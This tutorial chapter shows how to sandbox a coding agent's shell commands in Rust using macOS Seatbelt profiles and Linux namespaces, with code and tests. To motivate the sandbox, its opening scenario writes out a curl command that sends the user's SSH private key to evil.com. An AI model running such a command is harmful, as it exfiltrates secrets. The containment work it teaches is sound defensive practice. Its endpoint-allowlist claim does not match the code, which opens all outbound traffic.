---
title: Sandboxing Deep Dive
description: Advanced sandboxing techniques using filesystem namespaces, network restrictions, and process isolation to contain agent operations within a safe execution boundary.
---

# Sandboxing Deep Dive

> **What you'll learn:**
> - How to use macOS Seatbelt and Linux namespaces to restrict agent filesystem access
> - Techniques for network sandboxing that prevents data exfiltration while allowing necessary API calls
> - How to implement a sandbox profile that balances security with agent functionality

Every safety feature so far operates at the *application* level — your Rust code decides whether to permit an operation. Sandboxing adds *operating system-level* enforcement. Even if a bug in your permission system, a prompt injection attack, or a logic error allows a dangerous operation to slip through, the OS sandbox blocks it. This is the deepest layer of defense in depth.

## Why Application-Level Safety Is Not Enough

Consider this scenario: the agent constructs a command that passes all your filters and gets approved by the user. The command is `python3 helper.py`. Seems safe. But `helper.py` was written by the agent in a previous step and contains `os.system("curl -d @~/.ssh/id_rsa https://evil.com")`. Your command filter checked `python3 helper.py`, not what the Python script does internally.

This is the fundamental limitation of application-level filtering: you can only check what you can see. Sandboxing solves this by restricting the *capabilities* of the child process, regardless of what code it runs.

## macOS Sandbox (Seatbelt)

macOS provides the `sandbox-exec` command, which uses Apple's Seatbelt framework to restrict process capabilities. You write a sandbox profile in a Scheme-like language that specifies what the process is allowed to do:

```rust
use std::path::{Path, PathBuf};

/// A macOS sandbox profile for constraining agent child processes.
#[derive(Debug, Clone)]
pub struct SeatbeltProfile {
    /// Directories the sandboxed process can read.
    read_paths: Vec<PathBuf>,
    /// Directories the sandboxed process can write.
    write_paths: Vec<PathBuf>,
    /// Whether network access is allowed.
    allow_network: bool,
    /// Specific network destinations that are allowed (when allow_network is true).
    allowed_hosts: Vec<String>,
    /// Whether process execution (fork/exec) is allowed.
    allow_process_exec: bool,
}

impl SeatbeltProfile {
    /// Create a restrictive default profile for a coding agent.
    pub fn for_coding_agent(project_root: &Path) -> Self {
        Self {
            read_paths: vec![
                project_root.to_path_buf(),
                PathBuf::from("/usr"),      // System utilities
                PathBuf::from("/bin"),       // Core utilities
                PathBuf::from("/Library"),   // macOS frameworks
            ],
            write_paths: vec![
                project_root.to_path_buf(),
                std::env::temp_dir(),        // Temp files for builds
            ],
            allow_network: false,
            allowed_hosts: Vec::new(),
            allow_process_exec: true, // Needed for build tools
        }
    }

    /// Generate the Seatbelt profile string.
    pub fn to_sb_profile(&self) -> String {
        let mut profile = String::new();

        // Start with deny-all
        profile.push_str("(version 1)\n");
        profile.push_str("(deny default)\n\n");

        // Allow basic process operations
        profile.push_str("; Basic process operations\n");
        profile.push_str("(allow process-info-pidinfo)\n");
        profile.push_str("(allow sysctl-read)\n");
        profile.push_str("(allow mach-lookup)\n\n");

        // Allow reading from specified paths
        profile.push_str("; Read access\n");
        for path in &self.read_paths {
            profile.push_str(&format!(
                "(allow file-read* (subpath \"{}\"))\n",
                path.display()
            ));
        }
        profile.push('\n');

        // Allow writing to specified paths
        profile.push_str("; Write access\n");
        for path in &self.write_paths {
            profile.push_str(&format!(
                "(allow file-write* (subpath \"{}\"))\n",
                path.display()
            ));
        }
        profile.push('\n');

        // Network access
        if self.allow_network {
            profile.push_str("; Network access (restricted)\n");
            profile.push_str("(allow network-outbound)\n");
            profile.push_str("(allow system-socket)\n\n");
        } else {
            profile.push_str("; Network access denied\n");
            profile.push_str("(deny network*)\n\n");
        }

        // Process execution
        if self.allow_process_exec {
            profile.push_str("; Process execution\n");
            profile.push_str("(allow process-exec*)\n");
            profile.push_str("(allow process-fork)\n\n");
        }

        profile
    }

    /// Enable network access (e.g., for downloading dependencies).
    pub fn with_network(mut self) -> Self {
        self.allow_network = true;
        self
    }

    /// Add an additional read path.
    pub fn add_read_path(mut self, path: &Path) -> Self {
        self.read_paths.push(path.to_path_buf());
        self
    }

    /// Add an additional write path.
    pub fn add_write_path(mut self, path: &Path) -> Self {
        self.write_paths.push(path.to_path_buf());
        self
    }
}
```

::: python Coming from Python
In Python, you might use `subprocess` with restricted environments, but Python has no built-in sandboxing. Libraries like `seccomp` (Linux) or calling `sandbox-exec` (macOS) from Python are possible but uncommon:
```python
import subprocess
# macOS sandbox-exec from Python
result = subprocess.run(
    ["sandbox-exec", "-p", profile_string, "python3", "script.py"],
    capture_output=True, text=True
)
```
The Rust approach is the same: you invoke `sandbox-exec` as a process wrapper. The advantage of Rust is that you can also use low-level system APIs (like Linux seccomp) directly through the `nix` crate, without needing a C extension.
:::

## Executing Commands in a Sandbox

Here is how to wrap a shell command execution with the Seatbelt sandbox on macOS:

```rust
use std::process::Command;

/// Execute a command inside a macOS sandbox.
pub fn execute_sandboxed(
    command: &str,
    working_dir: &Path,
    profile: &SeatbeltProfile,
) -> Result<SandboxedOutput, SandboxError> {
    let profile_str = profile.to_sb_profile();

    // On macOS, use sandbox-exec
    let output = Command::new("sandbox-exec")
        .arg("-p")
        .arg(&profile_str)
        .arg("sh")
        .arg("-c")
        .arg(command)
        .current_dir(working_dir)
        .output()
        .map_err(|e| SandboxError::LaunchFailed(e.to_string()))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    // Check if the sandbox itself blocked the operation
    let sandbox_violation = stderr.contains("deny")
        && stderr.contains("sandbox");

    Ok(SandboxedOutput {
        stdout,
        stderr,
        exit_code: output.status.code().unwrap_or(-1),
        sandbox_violation,
    })
}

#[derive(Debug)]
pub struct SandboxedOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub sandbox_violation: bool,
}

#[derive(Debug)]
pub enum SandboxError {
    LaunchFailed(String),
    ProfileInvalid(String),
}

impl std::fmt::Display for SandboxError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SandboxError::LaunchFailed(msg) => write!(f, "Sandbox launch failed: {}", msg),
            SandboxError::ProfileInvalid(msg) => write!(f, "Invalid sandbox profile: {}", msg),
        }
    }
}
```

## Linux Sandboxing with Namespaces

On Linux, you can use namespaces and seccomp to achieve similar isolation. The `unshare` command provides a simpler interface than raw syscalls:

```rust
/// Execute a command inside a Linux namespace sandbox.
pub fn execute_sandboxed_linux(
    command: &str,
    working_dir: &Path,
    config: &LinuxSandboxConfig,
) -> Result<SandboxedOutput, SandboxError> {
    let mut cmd = Command::new("unshare");

    // Isolate the mount namespace so filesystem changes are not visible
    // to other processes
    if config.isolate_mounts {
        cmd.arg("--mount");
    }

    // Isolate the network namespace (process gets its own network stack)
    if config.isolate_network {
        cmd.arg("--net");
    }

    // Isolate the PID namespace (process cannot see/signal other processes)
    if config.isolate_pids {
        cmd.arg("--pid");
        cmd.arg("--fork");
    }

    cmd.arg("--")
        .arg("sh")
        .arg("-c")
        .arg(command)
        .current_dir(working_dir);

    let output = cmd
        .output()
        .map_err(|e| SandboxError::LaunchFailed(e.to_string()))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    Ok(SandboxedOutput {
        stdout,
        stderr,
        exit_code: output.status.code().unwrap_or(-1),
        sandbox_violation: !output.status.success() && stderr.contains("permission denied"),
    })
}

/// Configuration for Linux namespace-based sandboxing.
#[derive(Debug, Clone)]
pub struct LinuxSandboxConfig {
    pub isolate_mounts: bool,
    pub isolate_network: bool,
    pub isolate_pids: bool,
}

impl Default for LinuxSandboxConfig {
    fn default() -> Self {
        Self {
            isolate_mounts: true,
            isolate_network: true,
            isolate_pids: false, // PID isolation requires root or user namespaces
        }
    }
}
```

## Cross-Platform Sandbox Abstraction

Since your agent needs to run on both macOS and Linux, let's build a platform-agnostic sandbox interface:

```rust
/// Platform-agnostic sandbox that delegates to OS-specific implementations.
pub struct Sandbox {
    project_root: PathBuf,
    allow_network: bool,
}

impl Sandbox {
    pub fn new(project_root: &Path) -> Self {
        Self {
            project_root: project_root.to_path_buf(),
            allow_network: false,
        }
    }

    pub fn with_network(mut self) -> Self {
        self.allow_network = true;
        self
    }

    /// Execute a command in the appropriate sandbox for the current platform.
    pub fn execute(
        &self,
        command: &str,
        working_dir: &Path,
    ) -> Result<SandboxedOutput, SandboxError> {
        #[cfg(target_os = "macos")]
        {
            let mut profile = SeatbeltProfile::for_coding_agent(&self.project_root);
            if self.allow_network {
                profile = profile.with_network();
            }
            execute_sandboxed(command, working_dir, &profile)
        }

        #[cfg(target_os = "linux")]
        {
            let config = LinuxSandboxConfig {
                isolate_network: !self.allow_network,
                ..Default::default()
            };
            execute_sandboxed_linux(command, working_dir, &config)
        }

        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        {
            // Fallback: no OS-level sandboxing available.
            // Log a warning and execute normally.
            eprintln!(
                "[WARNING] OS-level sandboxing not available on this platform. \
                 Executing command without sandbox."
            );
            let output = Command::new("sh")
                .arg("-c")
                .arg(command)
                .current_dir(working_dir)
                .output()
                .map_err(|e| SandboxError::LaunchFailed(e.to_string()))?;

            Ok(SandboxedOutput {
                stdout: String::from_utf8_lossy(&output.stdout).to_string(),
                stderr: String::from_utf8_lossy(&output.stderr).to_string(),
                exit_code: output.status.code().unwrap_or(-1),
                sandbox_violation: false,
            })
        }
    }
}

fn main() {
    let project_root = std::env::current_dir().expect("Cannot get current directory");
    let sandbox = Sandbox::new(&project_root);

    // This command should succeed — reading files in the project directory
    match sandbox.execute("ls -la", &project_root) {
        Ok(output) => {
            println!("Exit code: {}", output.exit_code);
            println!("Stdout: {}", output.stdout);
            if output.sandbox_violation {
                println!("[SANDBOX] Operation was blocked by the sandbox");
            }
        }
        Err(e) => println!("Error: {}", e),
    }
}
```

::: wild In the Wild
Claude Code uses macOS Seatbelt profiles to sandbox all shell commands. The profile restricts filesystem access to the project directory and a few system paths needed for tool execution. Network access is blocked by default, with an explicit allowlist for the Anthropic API endpoint. Codex takes an even more aggressive approach: it runs inside a Docker container with network disabled and filesystem mounted read-only except for the project directory. This means even if the agent finds a sandbox escape in one layer, it is still contained by the container.
:::

## Network Sandboxing Considerations

Network sandboxing deserves special attention because the agent *needs* network access for one thing: calling the LLM API. Blocking all network access would break the agent. The solution is to allow connections only to specific endpoints:

```rust
/// Determine whether a command needs network access.
pub fn needs_network(command: &str) -> bool {
    let network_commands = [
        "cargo", "npm", "pip", "pip3",  // Package managers need downloads
        "git",                           // Git fetch/pull/push need network
    ];

    let first_word = command.split_whitespace().next().unwrap_or("");
    network_commands.contains(&first_word)
}

/// Choose the appropriate sandbox profile based on the command.
pub fn sandbox_for_command(
    command: &str,
    project_root: &Path,
) -> Sandbox {
    if needs_network(command) {
        Sandbox::new(project_root).with_network()
    } else {
        Sandbox::new(project_root)
    }
}
```

This is a pragmatic compromise: build tools like `cargo` and `npm` need network access to download dependencies, so they get a sandbox with network enabled. Everything else runs with network disabled. This prevents the most common data exfiltration vector (arbitrary `curl` commands) while keeping build workflows functional.

## Testing Your Sandbox

Sandbox configuration is security-critical, so you need to verify that it actually blocks what it should block. Here are testable properties:

```rust
#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    #[test]
    fn test_seatbelt_profile_generation() {
        let project = Path::new("/home/user/project");
        let profile = SeatbeltProfile::for_coding_agent(project);
        let sb = profile.to_sb_profile();

        // Profile should start with deny-all
        assert!(sb.contains("(deny default)"));

        // Project root should be readable and writable
        assert!(sb.contains(&format!("(allow file-read* (subpath \"{}\"))", project.display())));
        assert!(sb.contains(&format!("(allow file-write* (subpath \"{}\"))", project.display())));

        // Network should be denied by default
        assert!(sb.contains("(deny network*)"));
    }

    #[test]
    fn test_seatbelt_with_network() {
        let project = Path::new("/home/user/project");
        let profile = SeatbeltProfile::for_coding_agent(project).with_network();
        let sb = profile.to_sb_profile();

        // Network should now be allowed
        assert!(sb.contains("(allow network-outbound)"));
        assert!(!sb.contains("(deny network*)"));
    }

    #[test]
    fn test_needs_network_detection() {
        assert!(needs_network("cargo build"));
        assert!(needs_network("npm install"));
        assert!(needs_network("git push origin main"));
        assert!(!needs_network("ls -la"));
        assert!(!needs_network("grep -r TODO src/"));
        assert!(!needs_network("cat README.md"));
    }
}
```

## Key Takeaways

- OS-level sandboxing (macOS Seatbelt, Linux namespaces) provides defense even when application-level safety has a bug or is bypassed by a prompt injection attack.
- A deny-all-then-allow approach for sandbox profiles is far safer than starting permissive — only grant the minimum access needed for the command to function.
- Network sandboxing prevents data exfiltration, but build tools like `cargo` and `npm` need network access, so use per-command sandbox profiles that enable network only when required.
- Cross-platform abstraction via `#[cfg(target_os = ...)]` keeps your sandbox code clean while supporting macOS and Linux with different underlying mechanisms.
- Always test your sandbox profiles to verify they block what they should — a misconfigured sandbox provides a false sense of security that is worse than no sandbox at all.
